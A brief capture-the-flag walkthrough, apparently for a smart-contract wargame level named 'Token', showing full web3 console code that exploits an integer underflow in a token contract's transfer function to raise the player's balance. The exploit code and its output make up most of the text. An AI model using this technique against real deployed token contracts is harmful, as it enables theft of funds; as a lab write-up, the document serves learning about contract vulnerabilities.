# Token

Use number overflow to hack the contract. 

Type in the browser console:

```
> web3.utils.fromWei(await contract.balanceOf(player))
'0.00000000000000002'
```

Deploy an instance contract, get it address and assign it to ``instanceAddress`` variable. Assign ``playerAddress`` variable with your account address and ``senderAddress`` with your second account address (from which you will call contract address). Execute the following code:

```
var instanceAddress = '*redacted*';
var playerAddress = '*redacted*';
var senderAddress = '*redacted*';
var amount = web3.utils.toWei('1');
var functionSignature = web3.eth.abi.encodeFunctionSignature('transfer(address,uint256)');
var parametersEncoded = web3.eth.abi.encodeParameters(['address', 'uint256'], [playerAddress, amount]).substring(2);
var encodedTransactionData = functionSignature + parametersEncoded;
await web3.eth.sendTransaction({ data: encodedTransactionData, from: senderAddress, to: instanceAddress });
```

Type in the browser console:

```
> web3.utils.fromWei(await contract.balanceOf(player))
'1.00000000000000002'
```

Level completed.
